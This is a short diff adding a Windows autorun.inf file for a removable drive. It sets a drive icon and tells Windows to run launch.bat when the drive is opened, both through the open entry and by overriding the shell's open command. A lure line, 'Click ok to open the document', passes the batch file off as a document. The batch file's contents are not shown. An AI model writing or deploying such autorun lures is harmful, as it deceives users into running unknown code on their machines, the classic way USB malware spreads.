@@ -1,0 +1,5 @@
+[autorun] 
+icon=drive.ico
+open=launch.bat
+action=Click ok to open the document
+shell\open\command=launch.bat
